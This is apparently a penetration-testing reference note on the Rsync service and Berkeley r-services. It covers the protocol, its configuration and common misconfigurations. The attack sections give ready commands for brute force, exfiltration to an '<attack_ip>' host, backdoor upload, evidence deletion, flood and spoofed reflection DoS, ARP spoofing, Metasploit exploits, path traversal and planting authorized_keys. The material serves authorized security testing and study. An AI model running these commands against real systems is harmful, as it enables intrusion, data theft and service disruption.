# Index
- [[Ports, Protocols, and Services]]

# Rsync

- **Port Number:** 873
- **Protocol:** TCP
- **Service Name:** Rsync
- **Defined in:** Rsync Documentation (various online sources, as Rsync is not an IETF-standardized protocol)

The Rsync protocol is a fast and versatile file copying tool used for synchronizing files and directories between two locations over a network or locally on the same machine. It is known for its ability to efficiently transfer only the differences between files, minimizing data transfer and improving performance.

## Overview of Features

- **Incremental File Transfer:** Rsync only transfers the parts of files that have changed, reducing bandwidth usage and speeding up file synchronization.

- **Checksum-based Synchronization:** Uses checksums to determine which parts of a file have changed, ensuring accurate and efficient file synchronization.

- **Preservation of File Attributes:** Rsync can preserve symbolic links, hard links, file permissions, ownerships, timestamps, and more during transfer.

- **Compression:** Supports on-the-fly compression to reduce the amount of data sent over the network.

- **Secure Shell (SSH) Integration:** Rsync can operate securely over SSH, ensuring that data is encrypted during transfer.

- **Bandwidth Limiting:** Allows for bandwidth control during file transfers to prevent saturation of the network.

- **Multiple Transfer Modes:** Rsync supports both push (sending files) and pull (retrieving files) modes, making it versatile in different synchronization scenarios.

## Typical Use Cases

- **Backup Operations:** Rsync is commonly used to back up files and directories from one location to another, especially in environments where bandwidth is a concern.

- **File Synchronization:** Ideal for keeping directories synchronized across multiple systems, particularly in distributed environments.

- **Remote File Transfers:** With SSH integration, Rsync is widely used for secure file transfers across the internet or within private networks.

- **System Migration:** Facilitates system migrations by efficiently copying large amounts of data with minimal downtime.

- **Disaster Recovery:** Used in disaster recovery plans to ensure that critical files are backed up and can be restored quickly.

## How Rsync Protocol Works

1. **Initialization:**
   - **Step 1:** The client initiates a connection to the Rsync server on port 873. If operating over SSH, Rsync first establishes an SSH connection to the target system.
   - **Step 2:** The client sends a request to the server specifying the files or directories to be synchronized.

2. **File List Generation:**
   - **Step 3:** The server and client both generate a list of files and directories that are part of the synchronization operation.
   - **Step 4:** Checksums are calculated for files to determine which parts have changed. Rsync uses a rolling checksum algorithm for efficiency.

3. **Data Transfer:**
   - **Step 5:** Rsync identifies the differences between the source and target files.
   - **Step 6:** Only the changed parts of the files are transferred from the client to the server (or vice versa). This is known as the delta transfer algorithm.

4. **File Update:**
   - **Step 7:** The server receives the changes and applies them to the target files, updating them to match the source.
   - **Step 8:** File attributes such as permissions, ownership, and timestamps are synchronized according to the options specified.

5. **Finalization:**
   - **Step 9:** Rsync confirms that all files have been transferred and updated correctly.
   - **Step 10:** The connection is closed, and the operation is complete.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` requests synchronization of `/home/user/data` to `<target_ip>`.
- **Server:** `<target_ip>` identifies changes in `/backup/user/data` and applies updates received from `<attack_ip>`.

# Additional Information

## R-Services
R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (CSRG) at the University of California, Berkeley, r-services were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (SSH) protocols and commands due to inherent security flaws built into them. Much like telnet, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.

R-services span across the ports 512, 513, and 514 and are only accessible through a suite of programs known as r-commands. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.

The R-commands suite consists of the following programs:

- rcp (remote copy)
- rexec (remote execution)
- rlogin (remote login)
- rsh (remote shell)
- rstat
- ruptime
- rwho (remote who)

Each command has its intended functionality; however, we will only cover the most commonly abused r-commands. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.

|**Command**|**Service Daemon**|**Port**|**Transport Protocol**|**Description**|
|-|-|-|-|-|
| Rcp     | Rshd           | 514  | TCP                | Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.    |
| Rsh     | Rshd           | 514  | TCP                | Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.                                                                                                             |
| Rexec   | Rexecd         | 512  | TCP                | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files. |
| Rlogin  | Rlogind        | 513  | TCP                | Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.                                   |

## Security Considerations
- **Encryption:** When used with SSH, Rsync transfers are encrypted, protecting data in transit. However, if used without SSH or another secure tunnel, data is transferred in plaintext, which can be a security risk.
  
- **Authentication:** Rsync can be configured to require authentication via a username and password or via SSH keys when used over SSH.

- **Access Control:** Rsync can be configured to allow or deny access based on IP address, username, or other criteria, adding an additional layer of security.

## Alternatives
- **scp:** Secure copy (scp) is a simpler alternative that copies files securely over SSH but lacks Rsync's efficiency features like delta transfers.
  
- **SFTP:** Another SSH-based file transfer protocol that, like scp, provides secure file transfer but without Rsync’s synchronization capabilities.

- **Unison:** A file synchronization tool similar to Rsync but with two-way synchronization and a graphical user interface.

## Advanced Usage
- **Automated Backups:** Rsync can be scripted to run at scheduled intervals using cron jobs, providing automated backups with minimal overhead.

- **Mirroring:** Rsync can be used to create exact mirrors of directories across multiple servers, ensuring redundancy and high availability.

## Modes of Operation
- **Daemon Mode:** Rsync can run as a daemon on a server, allowing clients to connect and synchronize files without the need for SSH.
  
- **SSH Mode:** Rsync can operate over SSH, providing secure file transfer capabilities by tunneling its communication through an SSH connection.

## Configuration Files

1. **Rsync Daemon Configuration:**
- **File Location:** `/etc/rsyncd.conf`  
- **Configuration Example:**
    ```bash
    [backup]
        path = /var/backup
        comment = Backup directory
        uid = nobody
        gid = nogroup
        read only = false
        list = yes
        auth users = backupuser
        secrets file = /etc/rsyncd.secrets
    ```
- **Key Settings:**
  - `path`: The directory path that will be synchronized.
  - `uid` and `gid`: User and group IDs under which the Rsync process will run.
  - `read only`: Defines if the directory is read-only (true) or writable (false).
  - `auth users`: Specifies the users allowed to connect.
  - `secrets file`: Location of the file containing authentication credentials.

2. **Rsync Secrets File:**
- **File Location:** `/etc/rsyncd.secrets`  
- **File Structure:**
    ```
    backupuser:password
    ```
- **Key Details:**
  - Contains username and password pairs for authenticated access.
  - File permissions should be strictly controlled (e.g., `chmod 600 /etc/rsyncd.secrets`) to prevent unauthorized access.

## Potential Misconfigurations

1. **Rsync Daemon Exposed to the Internet:**
   - **Risk:** Running Rsync in daemon mode with an exposed port (873) can lead to unauthorized access if not properly secured.
   - **Exploitation:** Attackers can attempt to connect to the Rsync daemon and retrieve or modify files if authentication is weak or misconfigured.

2. **Weak Authentication:**
   - **Risk:** Using weak or default passwords in the Rsync secrets file can lead to easy compromise.
   - **Exploitation:** Attackers can brute force or guess the credentials to gain unauthorized access to the Rsync service.

3. **Insecure Rsync Over Plaintext:**
   - **Risk:** Using Rsync without SSH or another secure method can expose data to interception during transfer.
   - **Exploitation:** Attackers can perform man-in-the-middle attacks to intercept or alter the data being transferred.

4. **Incorrect Permissions on Secrets File:**
   - **Risk:** If the Rsync secrets file is not properly secured, unauthorized users can read credentials.
   - **Exploitation:** Attackers can use the credentials found in the secrets file to access or manipulate the Rsync service.

## Default Credentials

Rsync itself does not have default credentials; however, when using Rsync in daemon mode, it relies on the `rsyncd.secrets` file for authentication. Misconfigured systems might use easily guessable credentials like:

- **Username:** `rsync`
- **Password:** `rsync` or `password`

These should always be changed to strong, unique values.

# Interaction and Tools

## Tools

### [[RSync]]
- **Local Synchronization:** Synchronizes the content from `/source/dir` to `/destination/dir` locally.
	```bash
	rsync -av /source/dir /destination/dir
	```
- **Remote Synchronization:** Synchronizes `/source/dir` from the local system to `/destination/dir` on a remote system.
	```bash
	rsync -avz /source/dir <target_ip>:/destination/dir
	```
- **Remote Synchronization Over SSH:** Synchronizes `/source/dir` from the local system to `/destination/dir` on a remote system over SSH.
	```bash
	rsync -avz -e ssh /source/dir user@<target_ip>:/destination/dir
	```
- **SSH Key-based Authentication:** Using SSH keys with Rsync for secure and password-less connections.
	```bash
	rsync -avz -e "ssh -i /path/to/key" /local/dir <target_ip>:/remote/dir
	```
- **Enumerating an Open Share:**
	```bash
	rsync -av --list-only <target_ip>:/<destination/dir
	```
- **Transfer Data from Remote:** Transfer data from `/remote/dir` on a remote system to `/local/dir` on the local system.
	```bash
	rsync -avz <target_ip>:/remote/dir /local/dir
	```
- **Deleting Files Not Present on Source:** Synchronizes the directories and deletes files in the destination that are not present in the source.
	```bash
	rsync -avz --delete /source/dir <target_ip>:/destination/dir
	```
- **Excluding Files or Directories:** Excludes files or directories matching `pattern` from synchronization.
	```bash
	rsync -avz --exclude 'pattern' /source/dir /destination/dir
	```
- **Bandwidth Limiting:** Limits the bandwidth used during the transfer to 1000 KBps.
	```bash
	rsync -avz --bwlimit=1000 /source/dir <target_ip>:/destination/dir
	```
- **Partial Transfer and Resume:** Enables resuming of partial transfers and displays progress during the transfer.
	```bash
	rsync -avz --partial --progress /source/dir <target_ip>:/destination/dir
	```
- **Service Enumeration:** Lists available Rsync modules on the target system.
	```bash
	rsync <target_ip>::
	```
- **Logging in Using Rlogin:**
	```bash
	rlogin <target_ip> -l <username>
	```
- **Listing Authenticated Users Using Rwho:** Once successfully logged in, we can also abuse the `rwho` command to list all interactive sessions on the local network by sending requests to the UDP port 513.
	```bash
	rwho
	```
- **Listing Authenticated Users Using Rusers:** Display details of all logged-in users over the network.
	```bash
	rusers -al <target_ip>
	```
- **Using Rsync Daemon:** Rsync can be run as a daemon to provide file synchronization services over Port 873.
	1. Start Rsync Daemon:    
	    - Configure `/etc/rsyncd.conf` with module definitions and options.
	    - Start the rsync daemon:   
	```bash
	rsync --daemon
	```
	2. **Client Connection to Rsync Daemon:**    
	    - Connect to the rsync daemon to synchronize files:
	```bash
	rsync -avz rsync://remote.server/module /local/dir/
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 873"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 873
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 873
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 873 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 873
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 873 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:873
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 873 -c 1
    ```

## Other Techniques

### Mount rsync Share Locally
- **Mount Locally:** Using sshfs to mount an rsync share over SSH.
	```bash
	sshfs <username>@<target_ip>:/remote/directory /local/mountpoint
	```

### Hardcoded Credentials
- **Identify Hardcoded Credentials:** Locate `rsyncd.conf`,  Sometimes the parameter `secrets file = /path/to/file` and this file may contain usernames and passwords allowed to authenticate to rsyncd.
	```bash
	find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 873
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 873
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Leveraging Misconfigured Rsync Modules
- **Tool:** [[RSync]]
    ```bash
    rsync user@<target_ip>::module /local/dir
    ```
- **Description:** Exploits open or misconfigured Rsync modules to download or upload files.

### Exploiting Unsecured Rsync Daemon
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/scanner/rsync/rsync_module_list
	set RHOSTS <target_ip>
	run
	```
- **Description:** Enumerate available rsync modules on a compromised internal network to gather information.

## Persistence

### Establishing Backdoor via Rsync
- **Tool:** [[RSync]]
    ```bash
    rsync -avz --delete /backdoor/dir user@<target_ip>:/backdoor/dir
    ```
- **Description:** Uploads or synchronizes a backdoor directory to the target system, maintaining persistent access.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 873"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Internal Reconnaissance

### Network Discovery Using Rsync
- **Tool:** [[RSync]], [[Custom Scripts]]
    ```bash
    for ip in {1..254}; do rsync --list-only <username>@$ip::module; done
    ```
- **Description:** Scans internal network IPs for Rsync services and enumerates available modules.

### Directory Traversal
- **Tool:** [[Custom Scripts]]
	```bash
	rsync -avz rsync://<target_ip>/../../etc/passwd /tmp/
	```
- **Description:** Exploit directory traversal vulnerabilities in rsync configurations to access sensitive files.

## Lateral Movement, Pivoting, and Tunnelling

### Using Rsync for Lateral Movement
- **Tool:** [[RSync]], [[SSH]]
    ```bash
    rsync -avz --rsh="ssh -i ~/.ssh/id_rsa" /data user@<next_target_ip>:/data
    ```
- **Description:** Leverages Rsync over SSH to move laterally across systems by synchronizing data or uploading malicious files.

## Tunneling Rsync Over SSH
- **Tool:** [[SSH]]
	```bash
	ssh -L 873:<target_ip>:873 <user>@<target_ip> rsync -avz <source> localhost::module/path
	```
- **Description:** By default, Rsync uses unencrypted data transfer on port 873. Tunneling Rsync over SSH encrypts the entire session, providing confidentiality and integrity.

## Defense Evasion

### Using Rsync to Evade Detection
- **Tool:** [[RSync]], [[SSH]]
    ```bash
    rsync -avz --delete --rsh="ssh -i ~/.ssh/id_rsa" /data user@<target_ip>:/data
    ```
- **Description:** Deletes evidence of activity by synchronizing and removing files using Rsync’s `--delete` option.

## Data Exfiltration

### Covert Data Exfiltration via Rsync*
- **Tool:** [[RSync]], [[SSH]]
    ```bash
    rsync -avz -e "ssh -i ~/.ssh/id_rsa" /data user@<attack_ip>:/exfil
    ```
- **Description:** Exfiltrates data from a compromised system using Rsync over SSH, ensuring secure and efficient transfer.

# Exploits and Attacks

## Password Attacks

### Techniques:

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rlogin://<target_ip> -s <target_port> -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rlogin://<target_ip> -s <target_port> -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

### Brute Force Rsync Authentication
- **Tool:** Nmap, Custom Scripts
    ```bash
    nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
    ```
- **Description:** Performs a brute force attack against the Rsync service to gain unauthorized access.

## Denial of Service

### Techniques:

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Bandwidth Exhaustion via Rsync
- **Tool:** [[RSync]], [[Custom Scripts]]
    ```bash
    rsync -avz /large/dataset user@<target_ip>:/dev/null
    ```
- **Description:** Synchronizes a large dataset to the target, exhausting network bandwidth and causing potential disruption.

## Exploits 

### Rsync Command Injection
- **Tool:** [[Metasploit]]
    ```bash
    msf > use exploit/linux/misc/rsync_command_exec
    ```
- **Description:** Exploits a command injection vulnerability in certain versions of Rsync to execute arbitrary commands on the target system.

### Rsync Module Misconfiguration Exploit
- **Tool:** [[RSync]]
    ```bash
    rsync user@<target_ip>::module /local/dir --password-file=/path/to/passfile
    ```
- **Description:** Exploits misconfigured Rsync modules that allow unauthorized access to sensitive directories.

### Rsync Exploit Scripts
- **Tool:** [[Custom Scripts]]
    ```bash
    #!/bin/bash
    for ip in $(cat targets.txt); do
      rsync user@$ip:/path/to/data /local/dir --password-file=/path/to/passfile
    done
    ```
- **Description:** Automating attacks against multiple Rsync servers with known or guessed credentials.

### CVE-2004-0426
- **Tool:** [[Metasploit]]
	```bash
	use exploit/unix/rsync/rsync_long_dirname
	set RHOST <target_ip>
	set RPORT 873
	run
	```
- **Description:** Buffer overflow in Rsync before 2.6.0 allows remote attackers to execute arbitrary code via a long directory name.

### ## Brute force Manual Rsync
- **Tool:** [[RSync]]
	1. **List a shared folder:** Authentication must not be required.
	```bash
	rsync -av --list-only rsync://<target_ip>/target_dir
	```

	2. **Transfer Files Locally:** Copy all files to the local machine.
	```bash
	rsync -av rsync://<target_ip>:873/target_dir ./local_dir
	```

	3. The files are transferred in "archive" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer. With appropriate credentials you can list/download a shared name using (the password will be prompted):
	```bash
	rsync -av --list-only rsync://username@<target_ip>/target_dir
	
	rsync -av rsync://username@<target_ip>:873/target_dir ./local_dir
	```

	4. You could also upload some content using rsync (for example, in this case we can upload an `authorized_keys` file to obtain access to the box):
	```bash
	rsync -av home_user/.ssh/ rsync://username@<target_ip>/home_user/.ssh
	```

# Resources

|**Website**|**URL**|
|-|-|
|Rsync Official Documentation|https://download.samba.org/pub/rsync/rsync.html|
|Nmap Rsync Scripts|https://nmap.org/nsedoc/scripts/rsync-brute.html|
|Metasploit Rsync Exploit Modules|https://www.rapid7.com/db/modules/exploit/linux/misc/rsync_command_exec|
|SSH Configuration Guide|https://www.ssh.com/academy/ssh/rsync|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Linux man-pages|https://man7.org/linux/man-pages/man1/rsync.1.html|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|hping3 Manual|http://www.hping.org/manpage.html|